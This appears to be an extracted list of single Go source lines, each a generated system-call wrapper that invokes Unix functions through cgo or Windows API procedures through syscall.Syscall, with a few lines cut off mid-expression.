"r1 = uintptr(C.mknodat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(dev)))"
"r1 = uintptr(C.mlock(C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.mmap64(C.uintptr_t(addr), C.uintptr_t(length), C.int(prot), C.int(flags), C.int(fd), C.longlong(offset)))"
"r1 = uintptr(C.mprotect(C.uintptr_t(_p0), C.size_t(_lenp0), C.int(prot)))"
"r1 = uintptr(C.msync(C.uintptr_t(_p0), C.size_t(_lenp0), C.int(flags)))"
"r1 = uintptr(C.munlock(C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.munmap(C.uintptr_t(addr), C.uintptr_t(length)))"
"r1 = uintptr(C.nanosleep(C.uintptr_t(time), C.uintptr_t(leftover)))"
"r1 = uintptr(C.nrecvmsg(C.int(s), C.uintptr_t(msg), C.int(flags)))"
"r1 = uintptr(C.nsendmsg(C.int(s), C.uintptr_t(msg), C.int(flags)))"
"r1 = uintptr(C.open64(C.uintptr_t(_p0), C.int(mode), C.uint(perm)))"
"r1 = uintptr(C.openat(C.int(dirfd), C.uintptr_t(_p0), C.int(flags), C.uint(mode)))"
"r1 = uintptr(C.poll(C.uintptr_t(fds), C.int(nfds), C.int(timeout)))"
"r1 = uintptr(C.posix_fadvise64(C.int(fd), C.longlong(offset), C.longlong(length), C.int(advice)))"
"r1 = uintptr(C.pread64(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0), C.longlong(offset)))"
"r1 = uintptr(C.pselect(C.int(nfd), C.uintptr_t(r), C.uintptr_t(w), C.uintptr_t(e), C.uintptr_t(timeout), C.uintptr_t(sigmask)))"
"r1 = uintptr(C.pwrite64(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0), C.longlong(offset)))"
"r1 = uintptr(C.read(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.readlink(C.uintptr_t(_p0), C.uintptr_t(_p1), C.size_t(_lenp1)))"
"r1 = uintptr(C.recvfrom(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0), C.int(flags), C.uintptr_t(from), C.uintptr_t(fromlen)))"
"r1 = uintptr(C.renameat(C.int(olddirfd), C.uintptr_t(_p0), C.int(newdirfd), C.uintptr_t(_p1)))"
"r1 = uintptr(C.sendto(C.int(s), C.uintptr_t(_p0), C.size_t(_lenp0), C.int(flags), C.uintptr_t(to), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.setdomainname(C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.setgroups(C.int(n), C.uintptr_t(list)))"
"r1 = uintptr(C.sethostname(C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.setpgid(C.int(pid), C.int(pgid)))"
"r1 = uintptr(C.setpriority(C.int(which), C.int(who), C.int(prio)))"
"r1 = uintptr(C.setregid(C.int(rgid), C.int(egid)))"
"r1 = uintptr(C.setreuid(C.int(ruid), C.int(euid)))"
"r1 = uintptr(C.setrlimit(C.int(resource), C.uintptr_t(rlim)))"
"r1 = uintptr(C.setsockopt(C.int(s), C.int(level), C.int(name), C.uintptr_t(val), C.uintptr_t(vallen)))"
"r1 = uintptr(C.shutdown(C.int(fd), C.int(how)))"
"r1 = uintptr(C.socket(C.int(domain), C.int(typ), C.int(proto)))"
"r1 = uintptr(C.socketpair(C.int(domain), C.int(typ), C.int(proto), C.uintptr_t(fd)))"
"r1 = uintptr(C.splice(C.int(rfd), C.uintptr_t(roff), C.int(wfd), C.uintptr_t(woff), C.int(len), C.int(flags)))"
"r1 = uintptr(C.stat(C.uintptr_t(_p0), C.uintptr_t(statptr)))"
"r1 = uintptr(C.statfs(C.uintptr_t(_p0), C.uintptr_t(buf)))"
"r1 = uintptr(C.statx(C.int(dirfd), C.uintptr_t(_p0), C.int(flags), C.int(mask), C.uintptr_t(stat)))"
"r1 = uintptr(C.syslog(C.int(typ), C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.truncate(C.uintptr_t(_p0), C.longlong(length)))"
"r1 = uintptr(C.unlinkat(C.int(dirfd), C.uintptr_t(_p0), C.int(flags)))"
"r1 = uintptr(C.ustat(C.int(dev), C.uintptr_t(ubuf)))"
"r1 = uintptr(C.utime(C.uintptr_t(_p0), C.uintptr_t(buf)))"
"r1 = uintptr(C.utimensat(C.int(dirfd), C.uintptr_t(_p0), C.uintptr_t(times), C.int(flag)))"
"r1 = uintptr(C.utimes(C.uintptr_t(_p0), C.uintptr_t(times)))"
"r1 = uintptr(C.wait4(C.int(pid), C.uintptr_t(status), C.int(options), C.uintptr_t(rusage)))"
"r1 = uintptr(C.write(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1, _, e1 := syscall.Syscall(procAssignProcessToJobObject.Addr(), 2, uintptr(job), uintptr(process), 0)"
"r1, _, e1 := syscall.Syscall(procCancelIo.Addr(), 1, uintptr(s), 0, 0)"
"r1, _, e1 := syscall.Syscall(procCancelIoEx.Addr(), 2, uintptr(s), uintptr(unsafe.Pointer(o)), 0)"
"r1, _, e1 := syscall.Syscall(procCertCloseStore.Addr(), 2, uintptr(store), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall(procCertDeleteCertificateFromStore.Addr(), 1, uintptr(unsafe.Pointer(certContext)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procCertFreeCertificateContext.Addr(), 1, uintptr(unsafe.Pointer(ctx)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procChangeServiceConfig2W.Addr(), 3, uintptr(service), uintptr(infoLevel), uintptr(unsafe.Pointer(info)))"
"r1, _, e1 := syscall.Syscall(procCheckTokenMembership.Addr(), 3, uintptr(tokenHandle), uintptr(unsafe.Pointer(sidToCheck)), uintptr(unsafe.Pointer(isMember)))"
"r1, _, e1 := syscall.Syscall(procCloseHandle.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procCloseServiceHandle.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procConnectNamedPipe.Addr(), 2, uintptr(pipe), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall(procControlService.Addr(), 3, uintptr(service), uintptr(control), uintptr(unsafe.Pointer(status)))"
"r1, _, e1 := syscall.Syscall(procConvertSidToStringSidW.Addr(), 2, uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(stringSid)), 0)"
"r1, _, e1 := syscall.Syscall(procConvertStringSidToSidW.Addr(), 2, uintptr(unsafe.Pointer(stringSid)), uintptr(unsafe.Pointer(sid)), 0)"
"r1, _, e1 := syscall.Syscall(procCopySid.Addr(), 3, uintptr(destSidLen), uintptr(unsafe.Pointer(destSid)), uintptr(unsafe.Pointer(srcSid)))"
"r1, _, e1 := syscall.Syscall(procCreateDirectoryW.Addr(), 2, uintptr(unsafe.Pointer(path)), uintptr(unsafe.Pointer(sa)), 0)"
"r1, _, e1 := syscall.Syscall(procCreateEnvironmentBlock.Addr(), 3, uintptr(unsafe.Pointer(block)), uintptr(token), uintptr(_p0))"
"r1, _, e1 := syscall.Syscall(procCreateHardLinkW.Addr(), 3, uintptr(unsafe.Pointer(filename)), uintptr(unsafe.Pointer(existingfilename)), uintptr(reserved))"
"r1, _, e1 := syscall.Syscall(procCreateSymbolicLinkW.Addr(), 3, uintptr(unsafe.Pointer(symlinkfilename)), uintptr(unsafe.Pointer(targetfilename)), uintptr(flags))"
"r1, _, e1 := syscall.Syscall(procCryptGenRandom.Addr(), 3, uintptr(provhandle), uintptr(buflen), uintptr(unsafe.Pointer(buf)))"
"r1, _, e1 := syscall.Syscall(procCryptReleaseContext.Addr(), 2, uintptr(provhandle), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall(procDefineDosDeviceW.Addr(), 3, uintptr(flags), uintptr(unsafe.Pointer(deviceName)), uintptr(unsafe.Pointer(targetPath)))"
"r1, _, e1 := syscall.Syscall(procDeleteFileW.Addr(), 1, uintptr(unsafe.Pointer(path)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procDeleteService.Addr(), 1, uintptr(service), 0, 0)"
"r1, _, e1 := syscall.Syscall(procDeleteVolumeMountPointW.Addr(), 1, uintptr(unsafe.Pointer(volumeMountPoint)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procDeregisterEventSource.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procDestroyEnvironmentBlock.Addr(), 1, uintptr(unsafe.Pointer(block)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procEnumProcesses.Addr(), 3, uintptr(unsafe.Pointer(_p0)), uintptr(len(processIds)), uintptr(unsafe.Pointer(bytesReturned)))"
"r1, _, e1 := syscall.Syscall(procExitWindowsEx.Addr(), 2, uintptr(flags), uintptr(reason), 0)"
"r1, _, e1 := syscall.Syscall(procFindClose.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFindCloseChangeNotification.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFindNextChangeNotification.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFindNextFileW.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(data)), 0)"
"r1, _, e1 := syscall.Syscall(procFindNextVolumeMountPointW.Addr(), 3, uintptr(findVolumeMountPoint), uintptr(unsafe.Pointer(volumeMountPoint)), uintptr(bufferLength))"
"r1, _, e1 := syscall.Syscall(procFindNextVolumeW.Addr(), 3, uintptr(findVolume), uintptr(unsafe.Pointer(volumeName)), uintptr(bufferLength))"
"r1, _, e1 := syscall.Syscall(procFindVolumeClose.Addr(), 1, uintptr(findVolume), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFindVolumeMountPointClose.Addr(), 1, uintptr(findVolumeMountPoint), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFlushFileBuffers.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFlushViewOfFile.Addr(), 2, uintptr(addr), uintptr(length), 0)"
"r1, _, e1 := syscall.Syscall(procFreeEnvironmentStringsW.Addr(), 1, uintptr(unsafe.Pointer(envs)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFreeLibrary.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procFreeSid.Addr(), 1, uintptr(unsafe.Pointer(sid)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procGenerateConsoleCtrlEvent.Addr(), 2, uintptr(ctrlEvent), uintptr(processGroupID), 0)"
"r1, _, e1 := syscall.Syscall(procGetCommTimeouts.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(timeouts)), 0)"
"r1, _, e1 := syscall.Syscall(procGetComputerNameExW.Addr(), 3, uintptr(nametype), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(n)))"
"r1, _, e1 := syscall.Syscall(procGetComputerNameW.Addr(), 2, uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(n)), 0)"
"r1, _, e1 := syscall.Syscall(procGetConsoleMode.Addr(), 2, uintptr(console), uintptr(unsafe.Pointer(mode)), 0)"
"r1, _, e1 := syscall.Syscall(procGetConsoleScreenBufferInfo.Addr(), 2, uintptr(console), uintptr(unsafe.Pointer(info)), 0)"
"r1, _, e1 := syscall.Syscall(procGetExitCodeProcess.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(exitcode)), 0)"
"r1, _, e1 := syscall.Syscall(procGetFileAttributesExW.Addr(), 3, uintptr(unsafe.Pointer(name)), uintptr(level), uintptr(unsafe.Pointer(info)))"
"r1, _, e1 := syscall.Syscall(procGetFileInformationByHandle.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(data)), 0)"
"r1, _, e1 := syscall.Syscall(procGetModuleHandleExW.Addr(), 3, uintptr(flags), uintptr(unsafe.Pointer(moduleName)), uintptr(unsafe.Pointer(module)))"
"r1, _, e1 := syscall.Syscall(procGetProcessShutdownParameters.Addr(), 2, uintptr(unsafe.Pointer(level)), uintptr(unsafe.Pointer(flags)), 0)"
"r1, _, e1 := syscall.Syscall(procGetSecurityDescriptorControl.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(control)), uintptr(unsafe.Pointer(revision)))"
"r1, _, e1 := syscall.Syscall(procGetSecurityDescriptorGroup.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall(procGetSecurityDescriptorOwner.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall(procGetStartupInfoW.Addr(), 1, uintptr(unsafe.Pointer(startupInfo)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procGetUserNameExW.Addr(), 3, uintptr(nameFormat), uintptr(unsafe.Pointer(nameBuffre)), uintptr(unsafe.Pointer(nSize)))"
"r1, _, e1 := syscall.Syscall(procGetUserProfileDirectoryW.Addr(), 3, uintptr(t), uintptr(unsafe.Pointer(dir)), uintptr(unsafe.Pointer(dirLen)))"
"r1, _, e1 := syscall.Syscall(procGetVolumeNameForVolumeMountPointW.Addr(), 3, uintptr(unsafe.Pointer(volumeMountPoint)), uintptr(unsafe.Pointer(volumeName)), uintptr(bufferlength))"
"r1, _, e1 := syscall.Syscall(procGetVolumePathNameW.Addr(), 3, uintptr(unsafe.Pointer(fileName)), uintptr(unsafe.Pointer(volumePathName)), uintptr(bufferLength))"
"r1, _, e1 := syscall.Syscall(procImpersonateSelf.Addr(), 1, uintptr(impersonationlevel), 0, 0)"
"r1, _, e1 := syscall.Syscall(procInitializeSecurityDescriptor.Addr(), 2, uintptr(unsafe.Pointer(absoluteSD)), uintptr(revision), 0)"
"r1, _, e1 := syscall.Syscall(procIsWow64Process.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall(procIsWow64Process2.Addr(), 3, uintptr(handle), uintptr(unsafe.Pointer(processMachine)), uintptr(unsafe.Pointer(nativeMachine)))"
"r1, _, e1 := syscall.Syscall(procLookupPrivilegeValueW.Addr(), 3, uintptr(unsafe.Pointer(systemname)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(luid)))"
"r1, _, e1 := syscall.Syscall(procMakeSelfRelativeSD.Addr(), 3, uintptr(unsafe.Pointer(absoluteSD)), uintptr(unsafe.Pointer(selfRelativeSD)), uintptr(unsafe.Pointer(selfRelativeSDSize)))"
"r1, _, e1 := syscall.Syscall(procModule32FirstW.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(moduleEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procModule32NextW.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(moduleEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procMoveFileExW.Addr(), 3, uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(to)), uintptr(flags))"
"r1, _, e1 := syscall.Syscall(procMoveFileW.Addr(), 2, uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(to)), 0)"
"r1, _, e1 := syscall.Syscall(procOpenProcessToken.Addr(), 3, uintptr(process), uintptr(access), uintptr(unsafe.Pointer(token)))"
"r1, _, e1 := syscall.Syscall(procProcess32FirstW.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(procEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procProcess32NextW.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(procEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procProcessIdToSessionId.Addr(), 2, uintptr(pid), uintptr(unsafe.Pointer(sessionid)), 0)"
"r1, _, e1 := syscall.Syscall(procPulseEvent.Addr(), 1, uintptr(event), 0, 0)"
"r1, _, e1 := syscall.Syscall(procQueryServiceDynamicInformation.Addr(), 3, uintptr(service), uintptr(infoLevel), uintptr(dynamicInfo))"
"r1, _, e1 := syscall.Syscall(procQueryServiceStatus.Addr(), 2, uintptr(service), uintptr(unsafe.Pointer(status)), 0)"
"r1, _, e1 := syscall.Syscall(procReleaseMutex.Addr(), 1, uintptr(mutex), 0, 0)"
"r1, _, e1 := syscall.Syscall(procRemoveDirectoryW.Addr(), 1, uintptr(unsafe.Pointer(path)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procResetEvent.Addr(), 1, uintptr(event), 0, 0)"
"r1, _, e1 := syscall.Syscall(procRevertToSelf.Addr(), 0, 0, 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetCommTimeouts.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(timeouts)), 0)"
"r1, _, e1 := syscall.Syscall(procSetConsoleCursorPosition.Addr(), 2, uintptr(console), uintptr(position), 0)"
"r1, _, e1 := syscall.Syscall(procSetConsoleMode.Addr(), 2, uintptr(console), uintptr(mode), 0)"
"r1, _, e1 := syscall.Syscall(procSetCurrentDirectoryW.Addr(), 1, uintptr(unsafe.Pointer(path)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetDefaultDllDirectories.Addr(), 1, uintptr(directoryFlags), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetDllDirectoryW.Addr(), 1, uintptr(unsafe.Pointer(path)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetEndOfFile.Addr(), 1, uintptr(handle), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetEnvironmentVariableW.Addr(), 2, uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(value)), 0)"
"r1, _, e1 := syscall.Syscall(procSetEvent.Addr(), 1, uintptr(event), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetFileAttributesW.Addr(), 2, uintptr(unsafe.Pointer(name)), uintptr(attrs), 0)"
"r1, _, e1 := syscall.Syscall(procSetFileCompletionNotificationModes.Addr(), 2, uintptr(handle), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall(procSetHandleInformation.Addr(), 3, uintptr(handle), uintptr(mask), uintptr(flags))"
"r1, _, e1 := syscall.Syscall(procSetKernelObjectSecurity.Addr(), 3, uintptr(handle), uintptr(securityInformation), uintptr(unsafe.Pointer(securityDescriptor)))"
"r1, _, e1 := syscall.Syscall(procSetPriorityClass.Addr(), 2, uintptr(process), uintptr(priorityClass), 0)"
"r1, _, e1 := syscall.Syscall(procSetProcessPriorityBoost.Addr(), 2, uintptr(process), uintptr(_p0), 0)"
"r1, _, e1 := syscall.Syscall(procSetProcessShutdownParameters.Addr(), 2, uintptr(level), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall(procSetSecurityDescriptorControl.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(controlBitsOfInterest), uintptr(controlBitsToSet))"
"r1, _, e1 := syscall.Syscall(procSetSecurityDescriptorGroup.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(group)), uintptr(_p0))"
"r1, _, e1 := syscall.Syscall(procSetSecurityDescriptorOwner.Addr(), 3, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(owner)), uintptr(_p0))"
"r1, _, e1 := syscall.Syscall(procSetServiceStatus.Addr(), 2, uintptr(service), uintptr(unsafe.Pointer(serviceStatus)), 0)"
"r1, _, e1 := syscall.Syscall(procSetStdHandle.Addr(), 2, uintptr(stdhandle), uintptr(handle), 0)"
"r1, _, e1 := syscall.Syscall(procSetThreadToken.Addr(), 2, uintptr(unsafe.Pointer(thread)), uintptr(token), 0)"
"r1, _, e1 := syscall.Syscall(procSetVolumeLabelW.Addr(), 2, uintptr(unsafe.Pointer(rootPathName)), uintptr(unsafe.Pointer(volumeName)), 0)"
"r1, _, e1 := syscall.Syscall(procSetVolumeMountPointW.Addr(), 2, uintptr(unsafe.Pointer(volumeMountPoint)), uintptr(unsafe.Pointer(volumeName)), 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiBuildDriverInfoList.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(driverType))"
"r1, _, e1 := syscall.Syscall(procSetupDiCallClassInstaller.Addr(), 3, uintptr(installFunction), uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)))"
"r1, _, e1 := syscall.Syscall(procSetupDiCancelDriverInfoSearch.Addr(), 1, uintptr(deviceInfoSet), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiDestroyDeviceInfoList.Addr(), 1, uintptr(deviceInfoSet), 0, 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiDestroyDriverInfoList.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(driverType))"
"r1, _, e1 := syscall.Syscall(procSetupDiEnumDeviceInfo.Addr(), 3, uintptr(deviceInfoSet), uintptr(memberIndex), uintptr(unsafe.Pointer(deviceInfoData)))"
"r1, _, e1 := syscall.Syscall(procSetupDiGetDeviceInfoListDetailW.Addr(), 2, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoSetDetailData)), 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiGetDeviceInstallParamsW.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(deviceInstallParams)))"
"r1, _, e1 := syscall.Syscall(procSetupDiGetSelectedDevice.Addr(), 2, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiGetSelectedDriverW.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(driverInfoData)))"
"r1, _, e1 := syscall.Syscall(procSetupDiSetDeviceInstallParamsW.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(deviceInstallParams)))"
"r1, _, e1 := syscall.Syscall(procSetupDiSetSelectedDevice.Addr(), 2, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), 0)"
"r1, _, e1 := syscall.Syscall(procSetupDiSetSelectedDriverW.Addr(), 3, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(driverInfoData)))"
"r1, _, e1 := syscall.Syscall(procSetupUninstallOEMInfW.Addr(), 3, uintptr(unsafe.Pointer(infFileName)), uintptr(flags), uintptr(reserved))"
"r1, _, e1 := syscall.Syscall(procStartServiceCtrlDispatcherW.Addr(), 1, uintptr(unsafe.Pointer(serviceTable)), 0, 0)"
"r1, _, e1 := syscall.Syscall(procStartServiceW.Addr(), 3, uintptr(service), uintptr(numArgs), uintptr(unsafe.Pointer(argVectors)))"
"r1, _, e1 := syscall.Syscall(procTerminateJobObject.Addr(), 2, uintptr(job), uintptr(exitCode), 0)"
"r1, _, e1 := syscall.Syscall(procTerminateProcess.Addr(), 2, uintptr(handle), uintptr(exitcode), 0)"
"r1, _, e1 := syscall.Syscall(procThread32First.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(threadEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procThread32Next.Addr(), 2, uintptr(snapshot), uintptr(unsafe.Pointer(threadEntry)), 0)"
"r1, _, e1 := syscall.Syscall(procUnmapViewOfFile.Addr(), 1, uintptr(addr), 0, 0)"
"r1, _, e1 := syscall.Syscall(procVirtualFree.Addr(), 3, uintptr(address), uintptr(size), uintptr(freetype))"
"r1, _, e1 := syscall.Syscall(procVirtualLock.Addr(), 2, uintptr(addr), uintptr(length), 0)"
"r1, _, e1 := syscall.Syscall(procVirtualQuery.Addr(), 3, uintptr(address), uintptr(unsafe.Pointer(buffer)), uintptr(length))"
"r1, _, e1 := syscall.Syscall(procVirtualUnlock.Addr(), 2, uintptr(addr), uintptr(length), 0)"
"r1, _, e1 := syscall.Syscall(procWSACleanup.Addr(), 0, 0, 0, 0)"
"r1, _, e1 := syscall.Syscall(procWTSQueryUserToken.Addr(), 2, uintptr(session), uintptr(unsafe.Pointer(token)), 0)"
"r1, _, e1 := syscall.Syscall(procbind.Addr(), 3, uintptr(s), uintptr(name), uintptr(namelen))"
"r1, _, e1 := syscall.Syscall(procclosesocket.Addr(), 1, uintptr(s), 0, 0)"
"r1, _, e1 := syscall.Syscall(procconnect.Addr(), 3, uintptr(s), uintptr(name), uintptr(namelen))"
"r1, _, e1 := syscall.Syscall(procgetpeername.Addr(), 3, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r1, _, e1 := syscall.Syscall(procgetsockname.Addr(), 3, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r1, _, e1 := syscall.Syscall(proclisten.Addr(), 2, uintptr(s), uintptr(backlog), 0)"
"r1, _, e1 := syscall.Syscall(procshutdown.Addr(), 2, uintptr(s), uintptr(how), 0)"
"r1, _, e1 := syscall.Syscall12(procAllocateAndInitializeSid.Addr(), 11, uintptr(unsafe.Pointer(identAuth)), uintptr(subAuth), uintptr(subAuth0), uintptr(subAuth1), uintptr(subAuth2), uintptr(subAuth3), uintptr(subAuth4), uintptr(subAuth5), uintptr(subAuth6), uintptr(subAuth7), uintptr(unsafe.Pointer(sid)), 0)"
"r1, _, e1 := syscall.Syscall12(procChangeServiceConfigW.Addr(), 11, uintptr(service), uintptr(serviceType), uintptr(startType), uintptr(errorControl), uintptr(unsafe.Pointer(binaryPathName)), uintptr(unsafe.Pointer(loadOrderGroup)), uintptr(unsafe.Pointer(tagId)), uintptr(unsafe.Pointer(dependencies)), uintptr(unsafe.Pointer(serviceStartName)), uintptr(unsafe.Pointer(password)), uintptr(unsafe.Pointer(displayName)), 0)"
"r1, _, e1 := syscall.Syscall12(procCreateProcessAsUserW.Addr(), 11, uintptr(token), uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(unsafe.Pointer(procSecurity)), uintptr(unsafe.Pointer(threadSecurity)), uintptr(_p0), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)), 0)"
"r1, _, e1 := syscall.Syscall12(procCreateProcessW.Addr(), 10, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(unsafe.Pointer(procSecurity)), uintptr(unsafe.Pointer(threadSecurity)), uintptr(_p0), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)), 0, 0)"
"r1, _, e1 := syscall.Syscall12(procCryptQueryObject.Addr(), 11, uintptr(objectType), uintptr(object), uintptr(expectedContentTypeFlags), uintptr(expectedFormatTypeFlags), uintptr(flags), uintptr(unsafe.Pointer(msgAndCertEncodingType)), uintptr(unsafe.Pointer(contentType)), uintptr(unsafe.Pointer(formatType)), uintptr(unsafe.Pointer(certStore)), uintptr(unsafe.Pointer(msg)), uintptr(unsafe.Pointer(context)), 0)"
"r1, _, e1 := syscall.Syscall12(procEnumServicesStatusExW.Addr(), 10, uintptr(mgr), uintptr(infoLevel), uintptr(serviceType), uintptr(serviceState), uintptr(unsafe.Pointer(services)), uintptr(bufSize), uintptr(unsafe.Pointer(bytesNeeded)), uintptr(unsafe.Pointer(servicesReturned)), uintptr(unsafe.Pointer(resumeHandle)), uintptr(unsafe.Pointer(groupName)), 0, 0)"
"r1, _, e1 := syscall.Syscall12(procMakeAbsoluteSD.Addr(), 11, uintptr(unsafe.Pointer(selfRelativeSD)), uintptr(unsafe.Pointer(absoluteSD)), uintptr(unsafe.Pointer(absoluteSDSize)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer(daclSize)), uintptr(unsafe.Pointer(sacl)), uintptr(unsafe.Pointer(saclSize)), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(ownerSize)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer(groupSize)), 0)"
"r1, _, e1 := syscall.Syscall6(procAdjustTokenGroups.Addr(), 6, uintptr(token), uintptr(_p0), uintptr(unsafe.Pointer(newstate)), uintptr(buflen), uintptr(unsafe.Pointer(prevstate)), uintptr(unsafe.Pointer(returnlen)))"
"r1, _, e1 := syscall.Syscall6(procAdjustTokenPrivileges.Addr(), 6, uintptr(token), uintptr(_p0), uintptr(unsafe.Pointer(newstate)), uintptr(buflen), uintptr(unsafe.Pointer(prevstate)), uintptr(unsafe.Pointer(returnlen)))"
"r1, _, e1 := syscall.Syscall6(procCertAddCertificateContextToStore.Addr(), 4, uintptr(store), uintptr(unsafe.Pointer(certContext)), uintptr(addDisposition), uintptr(unsafe.Pointer(storeContext)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procCertVerifyCertificateChainPolicy.Addr(), 4, uintptr(policyOID), uintptr(unsafe.Pointer(chain)), uintptr(unsafe.Pointer(para)), uintptr(unsafe.Pointer(status)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procConvertSecurityDescriptorToStringSecurityDescriptorW.Addr(), 5, uintptr(unsafe.Pointer(sd)), uintptr(revision), uintptr(securityInformation), uintptr(unsafe.Pointer(str)), uintptr(unsafe.Pointer(strLen)), 0)"
